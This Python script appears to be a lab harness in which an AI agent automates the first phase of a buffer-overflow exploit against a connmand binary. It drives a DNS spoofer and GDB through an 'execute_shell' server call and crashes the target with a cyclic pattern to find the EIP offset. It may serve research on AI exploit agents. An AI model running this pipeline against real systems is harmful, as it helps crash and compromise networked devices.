# main.py
import os
import time
import json
import socket
import subprocess
from dotenv import load_dotenv
from agent import ExploitAgent

load_dotenv()

TARGET_HOST = 'target'
TARGET_PORT = 8080

class GDBClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.buffer = b""

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        for i in range(15):
            try:
                self.sock.connect((self.host, self.port))
                print("[AGENT] Connected to GDB MCP Server.")
                return
            except ConnectionRefusedError:
                time.sleep(1)
        raise ConnectionRefusedError("Could not connect to GDB server after multiple attempts.")

    def send_command(self, method, params=None):
        if not self.sock: self.connect()
        request = {"jsonrpc": "2.0", "method": method, "params": params or {}, "id": 1}
        print(f"[AGENT] Sending command to server: {method}")
        # Add a newline delimiter to mark the end of the message
        self.sock.sendall(json.dumps(request).encode() + b'\n')

        # Read from the socket until we have a full newline-terminated message
        while b'\n' not in self.buffer:
            self.buffer += self.sock.recv(1024)
        
        message_data, self.buffer = self.buffer.split(b'\n', 1)
        response = json.loads(message_data.decode())
        print(f"[AGENT] Received response from server: {response}")
        return response

    def close(self):
        if self.sock: self.sock.close()

def main(target_binary, aslr_mode):
    # This main logic remains the same as before
    print(f"***** AGENT STARTING EXPLOIT AGAINST: {target_binary} (ASLR: {aslr_mode.upper()}) *****")

    agent = ExploitAgent(model_name="openai/gpt-4o")
    gdb_client = GDBClient(TARGET_HOST, TARGET_PORT)

    try:
        print("\n--- 🚀 PHASE 1: Finding EIP Offset ---")
        gdb_client.connect()
        
        gdb_client.send_command('run')
        print("[AGENT] Target program is running inside GDB. Waiting for initialization...")
        time.sleep(3) 

        pattern = agent.generate_cyclic_pattern(1200)
        print(f"[AGENT] Generated a {len(pattern)}-byte cyclic pattern.")

        print("[AGENT] Starting DNS spoofer inside target container...")
        spoofer_command = f"python3 dns_spoofer.py --payload {pattern.encode().hex()} &"
        gdb_client.send_command('execute_shell', {'command': spoofer_command})
        time.sleep(1)

        print("[AGENT] Triggering exploit with 'dig' inside target container...")
        gdb_client.send_command('execute_shell', {'command': 'dig @127.0.0.1 dos.com'})
        
        print("[AGENT] Waiting for crash report from GDB...")
        crash_info = gdb_client.send_command('get_crash_info')
        
        if crash_info.get("status") == "crashed":
            print("[AGENT] Crash confirmed. Analyzing registers...")
            offset = agent.analyze_crash_and_get_offset(crash_info, len(pattern))
            print(f"--- ✅ SUCCESS: Agent determined offset is: {offset} ---")
        else:
            print("--- ❌ FAILED: Program did not crash as expected. ---")
            print(f"Final GDB Server Response: {crash_info}")

    except Exception as e:
        print(f"[AGENT] An error occurred during the exploit run: {e}")
    finally:
        gdb_client.close()
        print("\n🎉 Exploit sequence finished.")

if __name__ == "__main__":
    target = os.getenv("TARGET_BINARY", "connmand_no_sec")
    aslr = "on" if os.getenv("ASLR_SETTING", "2") == "2" else "off"
    main(target, aslr)